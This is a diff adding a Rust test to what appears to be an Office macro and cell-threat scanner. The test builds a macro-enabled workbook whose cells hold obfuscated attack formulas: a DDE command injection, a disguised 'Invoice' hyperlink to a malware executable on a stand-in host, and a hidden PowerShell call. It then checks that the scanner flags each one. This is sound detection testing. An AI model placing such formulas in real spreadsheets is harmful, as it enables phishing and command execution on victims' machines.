@@ -2264,3 +2264,80 @@ fn e2e_defined_name_and_very_hidden_sheet_threat_detection() {
     assert!(md_report.contains("## Worksheet & Cell Threats"));
     assert!(md_report.contains("- **Cell Threats:**"));
 }
+
+#[test]
+fn e2e_deobfuscated_cell_threat_and_dynamic_evaluation() {
+    let src = "Sub Harmless()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "DeobfuscationProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Harmless"],
+    );
+
+    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
+    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
+    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><workbookPr codeName=\"ThisWorkbook\"/><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\"/></sheets></workbook>";
+    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/></Relationships>";
+
+    // Cell A1: =CHAR(99)&CHAR(109)&CHAR(100)&"|'/c calc'!A0" (DDE obfuscation)
+    // Cell B1: =HYPERLINK(CONCATENATE("http://evil.example.com/malware", CHAR(46), CHAR(101), CHAR(120), CHAR(101)), "Invoice") (Hyperlink obfuscation)
+    // Cell C1: =CONCATENATE("powershell.exe -w hidden ", "calc.exe") (General command obfuscation)
+    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><f>=CHAR(99)&amp;CHAR(109)&amp;CHAR(100)&amp;&quot;|'/c calc'!A0&quot;</f></c><c r=\"B1\"><f>=HYPERLINK(CONCATENATE(&quot;http://evil.example.com/malware&quot;, CHAR(46), CHAR(101), CHAR(120), CHAR(101)), &quot;Invoice&quot;)</f></c><c r=\"C1\"><f>=CONCATENATE(&quot;powershell.exe -w hidden &quot;, &quot;calc.exe&quot;)</f></c></row></sheetData></worksheet>";
+
+    let xlsm = synthesize_zip(&[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", pkg_rels.as_bytes()),
+        ("xl/workbook.xml", wb.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
+        ("xl/vbaProject.bin", &cfb),
+        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
+    ]);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // Check A1: Deobfuscated DDE
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("De-obfuscated DDE")),
+        "A1 should be detected as de-obfuscated DDE: {threats:?}"
+    );
+
+    // Check B1: Deobfuscated Suspicious Hyperlink
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "SuspiciousHyperlink"
+            && t.description.contains("de-obfuscated")),
+        "B1 should be detected as de-obfuscated SuspiciousHyperlink: {threats:?}"
+    );
+
+    // Check C1: Deobfuscated Threat (powershell command)
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell.exe")),
+        "C1 should be detected as DeobfuscatedThreat: {threats:?}"
+    );
+
+    // Verify JSON export contains rule_id VBA-CELL-009
+    let json_report = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json_report.contains("\"rule_id\":\"VBA-CELL-009\""),
+        "JSON report should contain VBA-CELL-009: {json_report}"
+    );
+
+    // Verify SARIF export contains VBA-CELL-009
+    let sarif_report = inspection_to_sarif(&inspection, "deobfuscated.xlsm");
+    assert!(
+        sarif_report.contains("\"id\":\"VBA-CELL-009\""),
+        "SARIF rules should contain VBA-CELL-009: {sarif_report}"
+    );
+    assert!(
+        sarif_report.contains("\"ruleId\":\"VBA-CELL-009\""),
+        "SARIF results should contain VBA-CELL-009: {sarif_report}"
+    );
+}
